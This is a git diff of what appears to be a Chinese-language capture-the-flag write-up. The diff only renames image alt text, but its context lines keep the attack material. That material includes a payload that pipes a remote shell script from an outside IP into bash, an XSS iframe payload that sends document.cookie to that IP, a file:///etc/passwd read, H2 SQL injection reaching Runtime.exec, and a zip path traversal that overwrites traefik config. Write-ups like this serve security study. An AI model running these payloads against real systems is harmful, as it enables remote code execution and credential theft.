@@ -65,7 +65,7 @@ sudo /backup.sh
 _[2025.happy.new.year=system("curl http://156.238.233.9/shell.sh|bash");
 ```
 
-![1](./assets/001.jpg)
+![image](./assets/001.jpg)
 
 发现没有权限，并且看到一个backup.sh
 
@@ -97,7 +97,7 @@ ls -al
 cat /var/www/html/backup/Rflag
 ```
 
-![1](./assets/002.jpg)
+![image](./assets/002.jpg)
 
 把环境给清理了
 
@@ -139,7 +139,7 @@ echo "[√] 清理完成！建议重启系统：sudo reboot"
 
 在`acvtar.php`里面发现了文件读取，其中路径为用户ID
 
-![1](./assets/003.jpg)
+![image](./assets/003.jpg)
 
 还有一个重要文件就是`upload.php`了
 
@@ -180,9 +180,9 @@ avatar=acvtar.jpg&url=file:///etc/passwd
 
 只要上传了一个文件，并且文件是存在的就可以进行文件读取，其中得到这三个包
 
-![1](./assets/004.jpg)
+![image](./assets/004.jpg)
 
-![1](./assets/005.jpg)
+![image](./assets/005.jpg)
 
 但是读不了flag，典型的任意文件读取到RCE，其中比较难得，就是要把cookie带上，
 
@@ -216,7 +216,7 @@ avatar=acvtar.jpg&url=file:///etc/passwd
 
 这是我改的初步的，后面发现怎么搞都会报错，后来仔细看代码原来是
 
-![1](./assets/006.jpg)
+![image](./assets/006.jpg)
 
 必须要在`elseif`里面才会触发，感冒头晕被绕了，😩，所以我们不要带`acvtar`参数就可以成功
 
@@ -259,25 +259,25 @@ deactivate
 
 302和200还是有区别的，虽然结果一样
 
-![1](./assets/007.jpg)
+![image](./assets/007.jpg)
 
 ## EasyDB
 
 开局一个登录框，看看这个jar包里面的代码，直接搜索路由`/login`，然后发现包`challenge`，里面基本都是关键代码，看看
 
-![1](./assets/008.jpg)
+![image](./assets/008.jpg)
 
 调用函数检查用户名
 
-![1](./assets/009.jpg)
+![image](./assets/009.jpg)
 
 直接拼接语句，ohshit,那注入整起
 
-![1](./assets/010.jpg)
+![image](./assets/010.jpg)
 
 黑名单是这些，
 
-![1](./assets/011.jpg)
+![image](./assets/011.jpg)
 
 使用的是`h2`的数据库`jdbc:h2:mem:testdb`使用的是内存模式，可以进行堆叠注入，利用反射和拼接绕过，拿到`Runtime.exec`，`h2`的数据库可以利用`CREATE...CALL`来调用函数
 
@@ -310,11 +310,11 @@ docker run -d --name display_container -p 9999:3000 display
 
 来了，一看是个nodejs的应用，并且里面还有bot，就感觉是个xss了，从`index.js`得到参数为`text`，
 
-![1](./assets/012.jpg)
+![image](./assets/012.jpg)
 
 可以看到会进行访问，但是他就是没过去，说明要绕过，回来看如何处理的这个`text`，
 
-![1](./assets/013.jpg)
+![image](./assets/013.jpg)
 
 ```js
 document.addEventListener("DOMContentLoaded", function() {
@@ -365,7 +365,7 @@ app.use((req, res) => {
 
 纯文本返回可以进行任意内容构造，有点脏字符，注释掉就好了
 
-![1](./assets/014.jpg)
+![image](./assets/014.jpg)
 
 所以写出payload，`iframe`结束标签可以省略
 
@@ -373,7 +373,7 @@ app.use((req, res) => {
 <iframe/srcdoc="<script/src='**/fetch(`http://156.238.233.9:9999/`+document.cookie)//'></script>">
 ```
 
-![1](./assets/015.jpg)
+![image](./assets/015.jpg)
 
 ```http
 POST /report HTTP/1.1
@@ -390,7 +390,7 @@ Content-Length: 43
 {"text":"Jmx0O2lmcmFtZSZzb2w7c3JjZG9jJmVxdWFsczsmcXVvdDsmbHQ7c2NyaXB0JnNvbDtzcmMmZXF1YWxzOyZhcG9zOyZhc3Q7JmFzdDsmc29sO2ZldGNoJmxwYXI7JmdyYXZlO2h0dHAmY29sb247JnNvbDsmc29sOzE1NiZwZXJpb2Q7MjM4JnBlcmlvZDsyMzMmcGVyaW9kOzkmY29sb247OTk5OSZzb2w7JmdyYXZlOyZwbHVzO2RvY3VtZW50JnBlcmlvZDtjb29raWUmcnBhcjsmc29sOyZzb2w7JmFwb3M7Jmd0OyZsdDsmc29sO3NjcmlwdCZndDsmcXVvdDsmZ3Q7"}
 ```
 
-![1](./assets/016.jpg)
+![image](./assets/016.jpg)
 
 ## traefik
 
@@ -401,11 +401,11 @@ docker run -d --name traefik_container -p 10002:8080 traefik
 
 就一个go文件，慢慢看
 
-![1](./assets/017.jpg)
+![image](./assets/017.jpg)
 
 检测xff，然后就是上传解压了，以我的个人感觉，这里面肯定能覆盖
 
-![1](./assets/018.jpg)
+![image](./assets/018.jpg)
 
 解压文件的时候进行文件遍历，并且目录也是自己定，可以达到覆盖的效果但是这里的路径极其重要，上传文件夹在这个位置
 
@@ -415,7 +415,7 @@ public/upload/6c20d681-a875-4dd6-abc0-331ca1c5f571
 
 要想覆盖就要
 
-![1](./assets/019.jpg)
+![image](./assets/019.jpg)
 
 ```
 ./../../.config/dynamic.yml
@@ -496,7 +496,7 @@ else:
 
 写出脚本了，但是发现个问题，始终拿不到flag，后面仔细一看
 
-![1](./assets/020.jpg)
+![image](./assets/020.jpg)
 
 他是监听80端口的变化的，得把应用搞到80才能监听，才能实现覆盖，热加载
 
@@ -509,7 +509,7 @@ docker exec -it 36b02c422cf1 sh
 
 现在再来用脚本打一遍就拿到flag了
 
-![1](./assets/021.jpg)
+![image](./assets/021.jpg)
 
 # 小结
 
